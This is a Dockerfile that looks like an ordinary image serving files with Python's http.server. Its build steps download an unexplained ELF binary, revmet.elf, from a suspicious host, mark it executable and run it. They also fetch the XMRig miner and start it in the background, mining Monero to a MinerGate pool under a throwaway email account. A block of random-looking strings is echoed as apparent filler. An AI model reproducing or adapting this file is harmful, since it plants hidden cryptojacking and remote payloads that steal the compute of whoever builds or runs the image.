FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo MqFYj5kHjN1T4iVHcp6OQWSiDLR1AkZx UamuBnlMii7hVcSKAaDBKUlJKc6NP9nE XPXPgMR0zvi1NVJuK7LiYEpnrygi5bhy ZqGaCRjtbGuBPD8Wu0iz6aP7n1Eb3nGE ScwkSDImBu39979pkpmsVLWvnlYuSfzP dhMCxuu3d6AvpBDdLf9xB00sjNtQfc2X Dsho0NImmD3EGq1nWEIBLQBesw4z4PKq i4VQiGKXwsBQST1FUJMvtPDEmzH4czy1 LDNuSIGSVcEvWXfS2ITgS3KI6qpZkIXw sZM8Deuu0v69I5804Ss9u6kUXiHh3pBE 3lQttZ6d27BLVkcgNyHENVTzca48i85W Mw5IGAzgeSeJYpC3e9drw0QNj9RaDlzg DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]